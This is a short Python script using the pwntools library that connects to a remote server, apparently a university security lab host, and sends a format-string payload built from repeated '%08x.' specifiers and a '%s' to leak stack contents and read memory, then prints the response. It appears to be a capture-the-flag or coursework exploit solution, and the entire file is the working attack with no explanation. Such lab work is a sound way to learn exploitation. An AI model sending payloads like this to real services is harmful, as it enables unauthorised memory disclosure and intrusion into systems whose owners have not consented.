from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23191

s = remote(SERVER, PORT, timeout=9999)

s.sendline(b"%08x." * 6 + b"%s")
response = s.recvline()
print(response.decode())
